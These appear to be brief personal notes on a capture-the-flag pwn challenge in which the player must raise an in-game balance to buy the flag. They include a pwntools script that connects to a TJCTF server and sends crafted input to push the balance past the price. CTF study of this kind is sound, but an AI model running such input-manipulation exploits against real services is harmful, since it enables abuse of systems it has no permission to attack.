### N o T e S

---

Sometimes, just like web challenges, we have pwn questions where we need to attain a certain value to throw out the flag.
For example, i have 10 rupees and i can buy the flag for 1000 rupees.

Approach -->

python exploit : 

```py
from  pwn import *
context.log_level = 'critical'

s = remote ('problem1.tjctf.org', 8002)

print (s.recv())

for i in range (8):
   s.sendline('A anything')

s.sendline('A' + '2'*8)

s.sendline('F')
print(s.recv())
print(s.recv())
print(s.recv())

s.close()

```

#### character 2 has value 50 in python :

>>> chr(50)
'2'
>>> chr(100)
'd'

---

John Hammond video reference
